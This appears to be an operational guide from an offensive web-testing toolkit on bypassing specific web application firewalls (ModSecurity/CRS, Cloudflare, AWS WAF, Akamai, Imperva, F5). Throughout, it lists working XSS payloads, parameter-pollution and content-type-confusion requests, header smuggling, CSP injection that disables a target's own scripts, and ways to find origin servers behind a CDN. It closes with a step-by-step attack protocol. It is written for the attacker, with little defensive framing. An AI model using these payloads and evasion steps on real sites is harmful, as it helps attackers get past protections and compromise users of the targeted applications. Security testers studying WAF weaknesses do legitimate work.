# WAF-specific bypasses — ModSecurity, Cloudflare, AWS, and friends

Real WAFs have known bypass shapes — each vendor's parser has its
own quirks. The generic taxonomy is `filter-bypass.md`; this file
is the per-product operational guide.

---

## 1. ModSecurity + OWASP CRS — the open-source default

CRS rules are public — read the rule IDs the block-page names, then
find the variant that rule doesn't cover:

```text
rule 941100/941160 — xss filters on tags/attrs:
  bypass: <xss onmouseover=alert(1)>x</xss>  — unknown tag
  bypass: <a href="jAvAsCrIpT:alert(1)">x</a> — case mix
  bypass: %3cimg src=x onerror=alert(1)%3e — pct-encoded (if decoded)
  bypass: <img src=`x`onerror=`alert(1)`>   — backtick attrs

rule 942100 — libinjection-based — the xss-detection library:
  known bypasses are version-locked — fuzz via sanitizer_fuzz
  typical: <svg/onload=alert(1)> or <details open ontoggle=alert(1)>

parameter pollution:
  ?q=safe&q=<img src=x onerror=alert(1)>
   — ModSecurity often checks only the FIRST q — the app takes last
  ?q=<img src=x onerror=alert(1)>&q=safe
   — or the reverse order

multipart boundary tricks:
  Content-Disposition: form-data; name="q"; filename="x
  boundary-splits the payload across a multi-part boundary so the
  WAF sees the boundary text not the payload
```

The PL (paranoia level) matters — PL1 misses a lot that PL3 catches.
The version matters — CRS 3.x vs 4.x have different rule-sets.

---

## 2. Cloudflare — the CDN WAF

```text
cloudflare's managed rules — JS-injection detection is strict:
  - <script> alert( onerror= onload= — all fingerprinted
  - the known bypasses rotate — current-era examples:
    <a href="jAvAsCrIpT&colon;alert(1)">x</a>
    <svg/onload=alert(1)>
    <details open ontoggle=alert(1)>
    <img src=`x`onerror=`alert(1)`>

  - the "managed challenge" — sometimes the bypass is in a
    different CONTENT-TYPE — try:
      Content-Type: multipart/form-data vs urlencoded vs raw
  - URL-encoding tricks don't usually work — CF decodes before
    checking
  - the bypass corpus moves fast — use sanitizer_fuzz for current
    variants, don't memorize
```

The "CF-challenge-page" bypass — some CF setups let your own
subdomain path skip the WAF — `/cdn-cgi/` paths, `/_next/` paths,
or a subdomain without the CF proxy. Check the origin directly.

---

## 3. AWS WAF — the managed-rules quirk

```text
aws managed rule-groups:
  - AWSManagedRulesCommonRuleSet — includes XSS patterns
  - SQLiManagedRule — separate
  - the bypass corpus: standard-misses like backtick-attrs,
    nested tags, entity-encoded schemes
  - the "text transformation" config — some deployments decode
    URL/entities BEFORE matching, others don't — test both
```

The text-transformation gap: the WAF decodes `url_decode` then
`html_entity_decode` — a payload that survives BOTH decodes is the
bypass. `&#x3c;img...` decodes to `<img...` after html_entity_decode —
if the rule checked BEFORE that transform, you win.

---

## 4. Akamai / Imperva / F5 — the enterprise set

```text
akamai: custom rules per-customer — fingerprint via headers
  (`X-Akamai-Transformed`, `AkamaiGHost`)
imperva: the "Incapsula" cookie + JS-challenge — the bypass is
  often the underlying-app's own parser quirks
f5 asm: rule-sets similar to CRS — unicode/encoding tricks work
barracuda, sucuri, fortinet: similar signature-parsers
```

Each vendor's bypass list is version-locked — the practical move
is `sanitizer_fuzz` + `variant_matrix` against the live target —
memorized bypasses age fast.

---

## 5. The transport-layer tricks — how the REQUEST bypasses

```text
HTTP parameter pollution:
  ?q=<img src=x onerror=alert(1)>&q=safe     — first vs last wins
  ?q=safe&q=<img src=x onerror=alert(1)>     — order matters
  ?q=<img%20src=x%20onerror=alert(1)>&q=1   — mixed encodings

Content-Type confusion:
  same payload, different CT — the WAF's parser differs:
  application/x-www-form-urlencoded
  multipart/form-data (boundary-tricks)
  application/json (JSON-escaped payload)
  text/plain (no parse at all)

transfer-encoding: chunked
  — split the payload across chunks — WAF may reassemble wrong

HTTP/2 vs HTTP/1.1 —
  the WAF may not see h2's header compression — the payload in a
  header value travels differently
```

`tools/web/variant_matrix.py` sweeps the transport-shape families.

---

## 6. The header-smuggling — payloads in unusual carriers

```text
X-Forwarded-For: <img src=x onerror=alert(1)>
   — the WAF may not check headers it doesn't know about
Referer, User-Agent, Cookie, X-Custom-* headers
   — headers the app echoes are carriers — the WAF's coverage of
     non-standard headers is thinner than param coverage

POST-body fields with odd names:
  field_name[0]=<payload>      — array-index names
  field[name]=<payload>        — nested-name syntax
  field=<payload>&field=x      — repeated names
```

The WAF's parameter-name coverage matters — `field[0]` may parse
differently than `field`.

---

## 7. The "WAF-off" paths — origin access

```text
- find the origin IP — crt.sh, DNS history, favicon-hash shodan
  → bypass the CDN entirely
- the /cdn-cgi/, /_next/, /static/ paths often skip the WAF
- HTTP/1.0 requests — some WAFs only inspect 1.1+
- IP-access vs domain-access — direct-IP requests skip host-routing
```

The origin-bypass is the biggest win — the WAF is only on the CDN
edge. Find the origin via `osint-infra-records` techniques.

---

## 8. The "tighten the CSP" counter-move

```html
<meta http-equiv="Content-Security-Policy"
      content="script-src 'none'">
   -- inject a CSP that DISABLES the target's own JS — their
      defense scripts (WAF-bypass-detectors, integrity checks) stop
      running; then your second-stage payload lands unimpeded
```

The counter-defense trick — a WAF that adds client-side protection
can be disabled by your own injected CSP.

---

## 9. The practical protocol

```text
1. fingerprint: which WAF? (headers, block-page, cookies)
2. identify the rule-set (CRS version, managed rules, custom)
3. run sanitizer_fuzz for the blocked-string variant that survives
4. if the WAF is param-focused — try header/body-path carriers
5. if the WAF is content-type-locked — try multipart/json/plain
6. if CDN-fronted — hunt the origin directly
```

`sanitizer_fuzz.py` + `variant_matrix.py` are the systematic sweeps —
manual variant-guessing is the last resort.
